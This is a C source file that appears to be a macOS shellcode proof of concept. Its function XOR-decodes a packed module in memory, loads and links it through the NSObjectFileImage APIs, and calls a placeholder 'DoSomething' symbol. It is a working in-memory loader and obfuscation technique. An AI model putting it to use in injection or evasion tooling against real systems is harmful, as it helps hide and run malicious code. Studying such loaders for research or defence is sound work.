#include "Shellcode.h"

#define MAGIC_MASK 0xAA

size_t g_ShellcodeSignature = SHELLCODEARGS_SIGNATURE;

// Put the shellcode into it's own section
#pragma code_seg(push, shlcd, ".shlcd")
#pragma optimize("", off)
void Shellcode(void)
{
    ShellcodeArgs* pArgs = (ShellcodeArgs*)(SHELLCODEARGS_SIGNATURE);

    pArgs->pPrintf(pArgs->message);
    
    // First unpack the module
    uint8_t* pPackedModule = (uint8_t*)pArgs->pModuleLocation;
    for (uint32_t i = 0; i < pArgs->sizeOfModule; ++i)
    {
        pPackedModule[i] = pPackedModule[i] ^ MAGIC_MASK;
    }
    
    NSObjectFileImage img;
    
    pArgs->pNSCreateObjectFile(pPackedModule, pArgs->sizeOfModule, &img);
    
    NSModule unpackedModule = pArgs->pNSLinkModule(img, pArgs->empty, NSLINKMODULE_OPTION_NONE);
    
    NSSymbol nsDoSomethingSymbol = pArgs->pNSLookUpSymbol(unpackedModule, pArgs->symbol);

    DoSomethingFunction_t pDoSomethingFunction = (DoSomethingFunction_t)(pArgs->pNSAddressOfSymbol(nsDoSomethingSymbol));
    
    pDoSomethingFunction(5);
    
    while(true) { }
}
#pragma optimize("", on)
#pragma code_seg(pop, shlcd)
